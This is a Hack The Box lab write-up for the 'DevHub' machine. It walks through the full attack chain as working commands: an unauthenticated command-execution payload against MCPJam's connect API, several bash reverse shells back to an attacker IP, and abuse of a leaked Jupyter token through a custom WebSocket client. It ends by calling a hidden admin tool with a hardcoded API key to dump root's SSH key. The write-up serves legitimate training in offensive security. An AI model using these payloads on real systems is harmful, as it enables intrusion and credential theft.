# HTB DevHub Writeup

## Overview

DevHub exposed an internal development platform running MCPJam v1.4.2. The application was vulnerable to unauthenticated command execution through the MCPJam inspector API. This provided an initial shell as the `mcp-dev` service user.

Local enumeration revealed a Jupyter Lab instance running as the `analyst` user with its authentication token exposed in the process list. The Jupyter terminal API was used to execute commands as `analyst`, leading to user access.

Privilege escalation to root was achieved through an internal Flask-based operations MCP service running as root on localhost. The service source code was readable by `analyst` and contained a hardcoded API key. A hidden administrative tool exposed by the service allowed dumping `/root/.ssh/id_rsa`, which was then used to authenticate as root over SSH.

## Reconnaissance

Initial port scanning identified SSH and HTTP services.

```bash
nmap -p- --min-rate 5000 -Pn -oN scans/tcp-full.txt 10.129.6.227
```

```text
22/tcp open  ssh
80/tcp open  http
```

Service enumeration confirmed OpenSSH and nginx.

```bash
nmap -sC -sV -p22,80 -Pn -oN scans/tcp-services.txt 10.129.6.227
```

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  nginx 1.18.0
```

The web service redirected to `devhub.htb`.

```bash
echo "10.129.6.227 devhub.htb" | sudo tee -a /etc/hosts
```

Virtual host enumeration also identified:

```text
fuzz.devhub.htb
```

The main application exposed a DevHub internal development platform.

## Initial Access — MCPJam Command Execution

The application settings page disclosed the MCPJam version:

```text
MCPJam Version: v1.4.2
```

MCPJam v1.4.2 was vulnerable through the inspector endpoint:

```text
/api/mcp/connect
```

The vulnerable endpoint accepted a server configuration containing a command and arguments, which were executed server-side.

A callback was first used to confirm command execution.

On Kali:

```bash
cd /home/zendeni/htb_labs/devhub
python3 -m http.server 8000
```

Payload:

```bash
curl -i 'http://devhub.htb:6274/api/mcp/connect' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "serverConfig": {
      "command": "curl",
      "args": ["http://10.10.15.59:8000/mcpjam-rce-confirmed"],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

The callback reached the Kali HTTP server, confirming remote command execution.

A reverse shell was then obtained.

On Kali:

```bash
rlwrap -cAr nc -lvnp 4444
```

Payload:

```bash
curl -i 'http://devhub.htb:6274/api/mcp/connect' \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.59/4444 0>&1"],
      "env": {}
    },
    "serverId": "revshell1"
  }'
```

The shell connected back as `mcp-dev`.

```bash
whoami
id
hostname
```

```text
mcp-dev
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
devhub
```

The shell was upgraded.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

After backgrounding the shell with `Ctrl+Z`, terminal handling was fixed from Kali:

```bash
stty raw -echo; fg
```

## User Pivot — Exposed Jupyter Lab Token

Process enumeration revealed a Jupyter Lab instance running as `analyst`.

```bash
ps auxww | grep -E 'jupyter|python|server.py|mcp' | grep -v grep
```

Relevant process:

```text
analyst ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password=
```

The process arguments leaked the Jupyter token:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

The service was bound to localhost:

```bash
ss -tulpn
```

```text
127.0.0.1:8888
```

The Jupyter API was accessible locally with the token.

```bash
curl -s 'http://127.0.0.1:8888/api?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
```

```json
{"version": "2.17.0"}
```

The contents API showed a notebook directory.

```bash
curl -s 'http://127.0.0.1:8888/api/contents?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
```

A terminal was created through the Jupyter API.

```bash
curl -s -X POST 'http://127.0.0.1:8888/api/terminals?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' | python3 -m json.tool
```

```json
{
    "name": "1",
    "last_activity": "2026-05-31T09:29:51.507210Z"
}
```

A minimal WebSocket client was used to send commands to the Jupyter terminal.

```bash
cat > /tmp/jterm_raw.py <<'PY'
import base64
import os
import socket
import struct
import sys
import time

HOST = "127.0.0.1"
PORT = 8888
TERM = "1"
TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"

cmd = " ".join(sys.argv[1:]) if len(sys.argv) > 1 else "id; whoami; pwd"

path = f"/terminals/websocket/{TERM}?token={TOKEN}"
key = base64.b64encode(os.urandom(16)).decode()

s = socket.create_connection((HOST, PORT), timeout=5)
handshake = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
)
s.sendall(handshake.encode())

resp = s.recv(4096)
if b"101 Switching Protocols" not in resp:
    print(resp.decode(errors="ignore"))
    sys.exit(1)

def send_ws(text):
    payload = text.encode()
    frame = bytearray()
    frame.append(0x81)

    length = len(payload)
    mask_bit = 0x80

    if length < 126:
        frame.append(mask_bit | length)
    elif length < 65536:
        frame.append(mask_bit | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(mask_bit | 127)
        frame.extend(struct.pack(">Q", length))

    mask = os.urandom(4)
    frame.extend(mask)
    frame.extend(bytes(b ^ mask[i % 4] for i, b in enumerate(payload)))
    s.sendall(frame)

def recv_ws():
    hdr = s.recv(2)
    if not hdr:
        return ""
    b1, b2 = hdr
    length = b2 & 0x7f

    if length == 126:
        length = struct.unpack(">H", s.recv(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", s.recv(8))[0]

    masked = b2 & 0x80
    mask = s.recv(4) if masked else b""
    data = b""
    while len(data) < length:
        chunk = s.recv(length - len(data))
        if not chunk:
            break
        data += chunk

    if masked:
        data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))

    return data.decode(errors="ignore")

send_ws('["stdin", "' + cmd.replace("\\", "\\\\").replace('"', '\\"') + '\\n"]')

end = time.time() + 4
while time.time() < end:
    try:
        s.settimeout(1)
        out = recv_ws()
        if out:
            print(out)
    except Exception:
        break

s.close()
PY
```

Command execution through the Jupyter terminal was confirmed.

```bash
python3 /tmp/jterm_raw.py 'id; whoami; hostname; pwd'
```

A reverse shell was then started as `analyst`.

On Kali:

```bash
rlwrap -cAr nc -lvnp 5555
```

From the `mcp-dev` shell:

```bash
python3 /tmp/jterm_raw.py 'bash -c "bash -i >& /dev/tcp/10.10.15.59/5555 0>&1"'
```

The shell connected back as `analyst`.

```bash
whoami
id
```

```text
analyst
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

## User Flag

```bash
cat /home/analyst/user.txt
```

## Privilege Escalation — Internal OPSMCP Service

Process enumeration showed a Python service running as root.

```bash
ps auxww | grep -E 'opsmcp|server.py|jupyter|python' | grep -v grep
```

Relevant process:

```text
root ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The service was listening locally on port `5000`.

```bash
ss -tulpn
```

```text
127.0.0.1:5000
```

As `analyst`, the service source code was readable.

```bash
cat /opt/opsmcp/server.py
```

The application was a Flask-based internal operations MCP service.

```python
app = Flask(__name__)

VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The visible tools were exposed through `/tools/list`.

```python
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}
```

The source also defined hidden tools that were not shown in `/tools/list`.

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

The hidden `ops._admin_dump` tool contained functionality to read root’s SSH private key.

```python
if target == "ssh_keys":
    try:
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({
            "target": "ssh_keys",
            "root_private_key": key_data,
            "note": "Emergency recovery key dump"
        })
```

Because the Flask application was running as root, this endpoint could read `/root/.ssh/id_rsa`.

The service root endpoint confirmed OPSMCP was running.

```bash
curl -s http://127.0.0.1:5000/ | python3 -m json.tool
```

```json
{
    "auth": "Required - X-API-Key header",
    "endpoints": [
        "/tools/list",
        "/tools/call",
        "/health"
    ],
    "server": "OPSMCP",
    "status": "operational",
    "version": "2.1.0"
}
```

The visible tools were listed with the extracted API key.

```bash
curl -s http://127.0.0.1:5000/tools/list \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' | python3 -m json.tool
```

```json
{
    "count": 4,
    "tools": [
        "ops.system_status",
        "ops.list_services",
        "ops.check_disk",
        "ops.view_logs"
    ]
}
```

Although the hidden tool was not listed, it was still callable through `/tools/call`.

## Dumping Root SSH Key

The hidden tool was called with `target` set to `ssh_keys`.

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  --data-binary '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -m json.tool
```

The response contained the root private key.

```json
{
    "target": "ssh_keys",
    "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----..."
}
```

The key was extracted directly into a file on the target.

```bash
rm -f /tmp/root_id_rsa

curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  --data-binary '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' > /tmp/root_id_rsa

chmod 600 /tmp/root_id_rsa
```

The private key was then used to authenticate as root over SSH from the target to localhost.

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/root_id_rsa root@127.0.0.1
```

Root access was confirmed.

```bash
whoami
id
```

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

## Attack Path

```text
External HTTP service
→ MCPJam v1.4.2 unauthenticated command execution
→ Shell as mcp-dev
→ Process enumeration
→ Jupyter Lab token disclosure
→ Jupyter terminal command execution
→ Shell as analyst
→ Read OPSMCP service source code
→ Extract hardcoded API key
→ Call hidden administrative tool
→ Dump root SSH private key
→ SSH as root
```

## TTP Mapping

| Phase                         | Technique                                 | Evidence                                            |
| ----------------------------- | ----------------------------------------- | --------------------------------------------------- |
| Reconnaissance                | Service discovery                         | `nmap` identified SSH and HTTP                      |
| Initial Access                | Exploitation of public-facing application | MCPJam `/api/mcp/connect` command execution         |
| Execution                     | Command and scripting interpreter         | Bash reverse shell through MCPJam                   |
| Discovery                     | Process enumeration                       | Jupyter token discovered in process arguments       |
| Credential Access             | Token exposure                            | Jupyter token leaked via command-line arguments     |
| Lateral Movement / User Pivot | Local service abuse                       | Jupyter terminal API executed commands as `analyst` |
| Privilege Escalation          | Abuse of privileged internal service      | Root-run OPSMCP service exposed hidden admin tool   |
| Credential Access             | Private key disclosure                    | `ops._admin_dump` returned `/root/.ssh/id_rsa`      |
| Persistence/Access            | SSH private key authentication            | Root login using dumped SSH key                     |
| Impact                        | Full system compromise                    | Root shell and root flag access                     |

